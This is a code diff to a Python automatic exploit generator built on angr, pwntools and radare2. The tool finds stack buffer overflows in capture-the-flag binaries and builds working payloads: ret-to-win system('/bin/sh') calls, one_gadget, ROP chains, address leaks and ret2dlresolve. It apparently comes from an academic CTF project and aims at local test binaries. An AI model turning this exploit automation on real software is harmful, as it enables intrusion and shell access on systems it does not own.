@@ -17,7 +17,7 @@ from angr.storage.memory_mixins.address_concretization_mixin import MultiwriteAn
 from my_utils import *
 pwn.context.log_level = 'debug'
 pwn.context.arch = 'amd64'
-
+pwn.context.terminal = ['tmux', 'splitw', '-h']
 logging.basicConfig()
 logging.root.setLevel(logging.INFO)
 
@@ -150,6 +150,11 @@ class Bof_Aeg(object):
 
         self.entry_state = state.copy()
 
+    def generate_exploit(self, exploit):
+        with open(template["exploitfile"], 'w') as file:
+            file.write(exploit)
+        pwn.log.info("Exploit is Saved to the file "+template["exploitfile"])
+
     def find_stack_bof(self):
         """探索栈溢出漏洞
         """
@@ -165,11 +170,17 @@ class Bof_Aeg(object):
     def find_win(self):
         """
         寻找后门:
+        0. look for exec function
         1. system("/bin/sh") or system("cat flag")
         2. print flag to stdout
         """
-        pwn.log.info("Finding win...")
         self.win_addr = 0
+        pwn.log.info("Finding win...")
+        addrs = []
+        for addr, func in self.cfg.kb.functions.items():
+            if func.name == template["exec"]:
+                self.win_addr = addr
+                return
 
         # 寻找system("/bin/sh") or system("cat flag")
         if 'system' in elf.plt:
@@ -186,6 +197,7 @@ class Bof_Aeg(object):
 
                 st = simgr.found[0]
                 arg = st.memory.load(st.regs.rdi,8)
+                #loads 8 bytes from memory address stored in rdi
                 if arg.uninitialized:
                     break
                 cmd = st.solver.eval(st.memory.load(st.regs.rdi,8),cast_to=bytes)
@@ -197,8 +209,8 @@ class Bof_Aeg(object):
         
         # 寻找print flag to stdout
         flag_addrs = []
-        flag_addrs.extend(list(elf.search(b'flag\x00')))
-        flag_addrs.extend(list(elf.search(b'flag.txt\x00')))
+        flag_addrs.extend(list(elf.search(template["flag_start"].encode() + b'\x00')))
+        flag_addrs.extend(list(elf.search(template["flag_start"].encode() + b'.txt\x00')))
 
         for flag_addr in flag_addrs:
             xrefs = self.cfg.kb.xrefs.get_xrefs_by_dst(flag_addr)
@@ -209,12 +221,14 @@ class Bof_Aeg(object):
                 r2 = init_r2(filepath, b'')
                 # 执行到main的第一个block末尾
                 first_block = self.project.factory.block(elf.sym['main'])
+                #dcu: continue until
                 r2.cmd('dcu '+hex(\
                     first_block.addr+first_block.size-first_block.capstone.insns[-1].size))
+                #dr sets register value
                 r2.cmd('dr rip='+hex(tmp.block_addr))
                 r2.cmd('dc')
                 with open(outputpath,'rb') as f:
-                    if b'flag{test}' in f.read():
+                    if template["flag_start"].encode()+b'{' in f.read():
                         self.win_addr = tmp.block_addr
                         pwn.log.info("Found flag win_addr :0x%x"%self.win_addr)
                         return
@@ -236,6 +250,8 @@ class Bof_Aeg(object):
         if simgr.found != []:
             pwn.log.success("Exploration success!")
             payload = b"".join(simgr.found[0].posix.stdin.concretize())
+            self.generate_exploit(payload.hex())
+            pwn.gdb.attach(p)
             p.sendline(payload)
             try:
                 p.interactive()
@@ -250,14 +266,15 @@ class Bof_Aeg(object):
         pwn.log.info("Finding text/libc leak...")
         self.has_text_leak = False
         self.has_libc_leak = False
-
+        init_profile(filepath, libpath, inputpath, outputpath)
         r2 = init_r2(filepath, b'')
-        r2.cmd('dc')
+        # r2.cmd('-e bin.relocs.apply=true')
+        x = r2.cmd('dc')
         with open(outputpath,'rb') as f:
             data = f.read()
         map_data = json.loads(r2.cmd('dmj'))
         
-        if (b'0x555555' in data or b'\x55'*3 in data): # text leak
+        if (b'0x555555' in data or b'\x55'*3 in data): # text leak, base addr is 555555...
             if b'0x555555' in data:
                 aid = data.index(b'0x555555')
                 leak = int(data[aid:aid+14],16)
@@ -300,8 +317,8 @@ class Bof_Aeg(object):
 
         if not self.has_text_leak and not self.has_libc_leak:
             pwn.log.error("PIE and No leak!")
-
-        p.recvuntil(recv_str)
+        if recv_str:
+            p.recvuntil(recv_str)
         if recv_type == 'str':
             leak = int(p.recv(14),16)
         elif recv_type == 'byte':
@@ -337,28 +354,12 @@ class Bof_Aeg(object):
 
         win_addr = self.win_addr if not elf.pie else self.win_addr-elf.address+self.text_base
         state = self.vuln_state.copy()
-        set_concrete(state, self.vuln_control_addrs, pwn.p64(win_addr))
-        payload = b''.join(state.posix.stdin.concretize())
-        
         # system has movaps(check rsp & 0xf == 0)
         global p
-        p.sendline(payload)
-        try:
-            res = p.recvuntil(b'flag{test}',timeout=0.1)
-            if b'flag{test}' in res:
-                print(res)
-                p.close()
-                killmyself()
-
-            p.sendline(b'cat flag')
-            res = p.recvuntil(b'flag{test}',drop=False)
-            print(res)
-            p.interactive()
-        except KeyboardInterrupt:
-            killmyself()
-        except: # 后门失败,有可能是system的栈对齐问题
+        try: # 后门失败,有可能是system的栈对齐问题
             p.close()
             p = pwn.process(filepath, env={'LD_LIBRARY_PATH':libpath})
+
             if elf.pie: # 需要重新leak
                 if self.leak_recv_type == 'str':
                     leak = int(p.recv(14),16)
@@ -370,13 +371,29 @@ class Bof_Aeg(object):
 
             rop = self.get_rop()
             state = self.vuln_state.copy()
-            set_concrete(state, self.vuln_control_addrs, pwn.p64(rop.search(regs=['rdi']).address+1)+pwn.p64(win_addr))
+            rdi_addr = rop.search(regs=['rdi'])
+            if rdi_addr:
+                rdi_addr = pwn.p64(rdi_addr.address+1)
+            else:
+                rdi_addr = b""
+            log.info(f"rdi addr:{rdi_addr}")
+            set_concrete(state, self.vuln_control_addrs, rdi_addr + pwn.p64(win_addr))
             payload = b''.join(state.posix.stdin.concretize())
+            self.generate_exploit(payload.hex())
+            pwn.context.terminal = ['bash']
+            #get pid of the process
+            print(p.pid)
+            inp = input("attach gdb? (y/n)")
             p.sendline(payload)
+            #attach gdb
+            # pwn.gdb.attach(p, '''
+
             try:
                 p.interactive()
             finally:
                 killmyself()
+        except KeyboardInterrupt:
+            killmyself()
 
     def ret_to_one(self):
         """存在libc地址泄漏, ret to one_gadget
@@ -395,6 +412,7 @@ class Bof_Aeg(object):
         state = self.vuln_state.copy()
         set_concrete(state, self.vuln_control_addrs, pwn.p64(self.libc_base+one_offset)[:6])
         getshell = b''.join(state.posix.stdin.concretize())
+        self.generate_exploit(getshell.hex())
         p.sendline(getshell)
         try:
             p.interactive()
@@ -418,6 +436,7 @@ class Bof_Aeg(object):
         state = self.vuln_state.copy()
         set_concrete(state, self.vuln_control_addrs, rop.chain())
         getshell = b''.join(state.posix.stdin.concretize())
+        self.generate_exploit(getshell.hex())
         p.sendline(getshell)
         try:
             p.interactive()
@@ -449,7 +468,8 @@ class Bof_Aeg(object):
         vuln_func_addr = self.vuln_func.address if not elf.pie else self.vuln_func.address-elf.address+self.text_base
         
         payload = b''
-        payload += pwn.p64(rop.rdi.address+1) # movaps align
+        if(rop.rdi):
+            payload += pwn.p64(rop.rdi.address+1) # movaps align
         payload += rop.chain()
         payload += pwn.p64(vuln_func_addr)
 
@@ -482,6 +502,8 @@ class Bof_Aeg(object):
         state = self.vuln_state.copy()
         set_concrete(state, self.vuln_control_addrs, payload)
         getshell = b''.join(state.posix.stdin.concretize())
+        self.generate_exploit(getshell.hex())
+        pwn.gdb.attach(p)
         p.sendline(getshell)
         try:
             p.interactive()
@@ -503,8 +525,13 @@ class Bof_Aeg(object):
         state = self.vuln_state.copy()
         set_concrete(state, self.vuln_control_addrs, rop.chain())
         rop_chain = b''.join(state.posix.stdin.concretize())
+        #print rop instructions
+        log.info(f"rop chain:{rop.dump()}")
+        pwn.gdb.attach(p)
         p.send(rop_chain)
         pwn.sleep(0.1)
+        self.generate_exploit(dlresolve.payload.hex())
+        log.info(f"dlresolve payload:{dlresolve.payload}")
         p.sendline(dlresolve.payload)
         try:
             p.interactive()
@@ -542,6 +569,7 @@ if __name__ == '__main__':
     args = parser.parse_args()
 
     binary = args.file
+    global template
     template = args.template
     if not is_valid_file(binary) or not is_valid_file(template):
         exit(1)
@@ -556,7 +584,7 @@ if __name__ == '__main__':
     libpath = template["libpath"]
     # libpath = "/home/aditya/Documents/UGRC/bof_aeg"
     init_profile(filepath, libpath, inputpath, outputpath)
-
+    # pty = process.PTY
     pwn.ctx.binary = filepath
     pwn.ctx.custom_lib_dir = libpath
     pwn.ctx.debug_remote_libc = True
